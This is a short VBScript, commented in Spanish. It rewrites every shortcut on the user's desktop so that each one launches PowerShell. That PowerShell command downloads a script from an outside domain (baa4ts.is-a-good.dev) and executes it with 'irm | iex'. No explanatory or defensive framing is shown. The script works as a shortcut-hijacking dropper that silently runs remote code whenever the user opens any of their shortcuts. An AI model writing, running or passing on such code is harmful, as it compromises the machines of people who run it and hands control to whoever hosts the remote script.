' cambiar_accessos.vbs
Option Explicit

Dim shell, fso, carpeta, archivo, accesoDirecto
Dim escritorio, nuevoDestino

' Comando que se asignará al acceso directo
nuevoDestino = "powershell.exe -c ""irm 'https://ejemplo.com/script.ps1' | iex"""

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Ruta al escritorio del usuario
escritorio = shell.SpecialFolders("Desktop")

Set carpeta = fso.GetFolder(escritorio)

For Each archivo In carpeta.Files
    If LCase(fso.GetExtensionName(archivo.Name)) = "lnk" Then
        Set accesoDirecto = shell.CreateShortcut(archivo.Path)
        accesoDirecto.TargetPath = "powershell.exe"
        accesoDirecto.Arguments = "-c ""irm 'https://baa4ts.is-a-good.dev/IN.ps1' | iex"""
        accesoDirecto.Save
    End If
Next

WScript.Echo "Accesos directos modificados."
